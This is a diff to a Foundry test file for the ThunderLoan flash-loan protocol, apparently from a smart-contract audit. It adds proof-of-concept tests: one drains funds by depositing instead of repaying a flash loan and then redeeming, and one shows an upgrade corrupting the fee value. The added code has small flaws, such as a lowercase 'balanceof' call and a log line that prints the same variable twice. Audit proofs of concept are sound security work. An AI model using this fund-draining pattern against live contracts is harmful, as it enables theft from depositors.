@@ -186,6 +186,28 @@ contract ThunderLoanOracleManipulationTest is Test{
         console2.log("Attack Fee is: ", attackFee);
         assert(attackFee < normalFeeCost);
     }
+    function testUseDepositInstead0fRepayToStealFunds() public setAllowedToken hasDeposits {
+vm.startPrank(user);
+uint256 amountToBorrow = 50e18;
+uint256 fee = thunderLoan.getCalculatedFee (tokenA, amountToBorrow);
+DepositOverRepay dor = new DepositOverRepay (address (thunderLoan));
+tokenA.mint(address(dor), fee);
+thunderLoan.flashloan (address (dor), tokenA, amountToBorrow, "");
+dor.redeemMoney();
+vm.stopPrank();
+assert(tokenA.balanceof(address (dor)) > 50e18 + fee);
+}
+   function testUpgradeBreaks() public {
+uint256 feeBeforeUpgrade = thunderLoan.getFee();
+vm.startPrank (thunderLoan.owner());
+ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
+thunderLoan.upgradeToAndCall(address(upgraded), "");
+uint256 feeAfterUpgrade = thunderLoan.getFee();
+vm.stopPrank();
+console.log("Fee Before: ", feeBeforeUpgrade);
+console.log("Fee After: ", feeBeforeUpgrade);
+assert(feeBeforeUpgrade != feeAfterUpgrade);
+}
 }
 
 //////////////////////////////////////////////////////////////
@@ -235,6 +257,6 @@ contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
 
         return true;
     }
+
+ 
 }
-//IMAPCT:medium/low
-//LIKELIHOOD :high
